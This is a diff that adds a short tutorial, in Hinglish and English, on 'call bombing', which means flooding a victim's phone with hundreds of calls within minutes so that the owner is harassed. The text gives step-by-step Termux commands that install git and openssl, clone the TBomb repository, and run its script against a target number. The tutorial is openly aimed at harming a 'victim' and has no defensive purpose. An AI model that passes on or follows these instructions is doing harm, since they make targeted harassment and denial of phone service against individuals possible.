@@ -1,0 +1,73 @@
+=> Call Bombing main aap kisi ke number pr ek saath 15-20 call kr sakte ho jisse user preshaan hojega, iss attack bs iss attack main itna he h
+
+ 
+
+=> Call Bombing is a technique where we can do 100's of call on a Victim mobile within 2-3 minutes time span.
+
+
+Go to Playstore => Install Termux application 
+
+ 
+
+Step #2 => Type These Commands
+
+ 
+
+Command #1 => pkg install git
+( If it asks, do you want to continue, press Y and than enter
+
+agar installation ke waqt isne pucha, do you want to continue tabh press Y and enter )
+
+
+Command #2.2 => 
+
+pkg install openssl
+
+( If it asks, do you want to continue, press Y and than enter
+
+agar installation ke waqt isne pucha, do you want to continue tabh press Y and enter )
+
+Command #2.3 => 
+
+pip install --upgrade pip
+
+( If it asks, do you want to continue, press Y and than enter
+
+agar installation ke waqt isne pucha, do you want to continue tabh press Y and enter )
+
+Command #3 => 
+
+ 
+
+git clone https://github.com/TheSpeedX/TBomb.git
+
+ 
+
+Command #4 => 
+
+cd TBomb
+
+
+
+Command #5 =>
+
+chmod +x TBomb.sh
+
+
+Command #6 =>
+
+
+./TBomb.sh
+
+
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
